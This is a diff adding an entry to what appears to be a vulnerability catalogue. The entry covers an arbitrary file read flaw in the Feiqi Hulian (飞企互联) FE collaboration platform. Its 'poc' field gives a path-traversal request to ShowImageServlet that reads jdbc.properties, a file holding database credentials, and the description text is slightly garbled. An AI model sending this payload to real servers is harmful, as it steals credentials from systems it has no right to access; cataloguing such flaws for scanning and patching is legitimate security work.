@@ -1,0 +1,8 @@
+vendor = "飞企互联"
+name = "飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞"
+type = "任意文件读取"
+source = "TG"
+info = "飞企互联 FE业务协作平台 ShowImageServlet接口存在各种文件读取漏洞，攻击者通过漏洞可以获取服务器中 网络测绘 “flyrise.stopBackspace.js”"
+date = "08.14"
+poc = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
+label = "nday"
